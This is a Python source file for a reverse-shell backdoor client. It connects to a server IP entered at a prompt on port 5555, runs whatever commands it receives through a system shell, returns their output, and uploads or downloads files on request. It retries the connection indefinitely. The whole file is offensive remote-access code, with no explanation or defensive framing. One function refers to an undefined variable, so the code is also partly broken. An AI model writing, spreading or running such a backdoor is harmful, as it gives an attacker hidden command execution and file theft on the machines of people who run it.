import socket, json, subprocess, time, os

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ""
    while True:
        try:
            data = data + s.recv(1024).decode().strip()
            return json.loads(data)
        except ValueError:
            continue

def download_file(file):
    print("Downloading file %s" % file)
    print("Starting file download from remote host")
    with open(file, "wb") as f:
        print("set the timeout to 1")
        s.settimeout(1)
        print("Trying to recv 1024 bytes")
        chunk = target.recv(1024)
        while chunk:
            print("entered while loop")
            f.write(chunk)
            try:
                chunk = s.recv(1024)
            except socket.timeout as e:
                break
    s.settimeout(None)

def upload_file(file):
    with open(file, "rb") as f:
        s.send(f.read())

def shell():
    while True:
        command = reliable_recv()
        if command == "quit":
            break

        elif command[:3] == "cd ":
            os.chdir(command[3:])

        elif command == "clear":
            pass

        elif command[:8] == "download":
            upload_file(command[9:])

        elif command[:6] == "upload":
            download_file(command[7:])

        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

def connection(your_ip):
    time.sleep(1)
    try:
        s.connect((your_ip,5555))
        shell()
        s.close()

    except:
        connection(your_ip)



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
your_ip = input("server ip:\n")
connection(your_ip)
